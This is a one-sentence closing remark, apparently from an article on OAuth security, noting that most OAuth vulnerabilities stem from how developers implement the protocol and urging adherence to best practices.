Remember: **Most OAuth vulnerabilities aren't in the protocol itself, but in how developers implement it.** Stay vigilant, follow best practices, and keep security top-of-mind.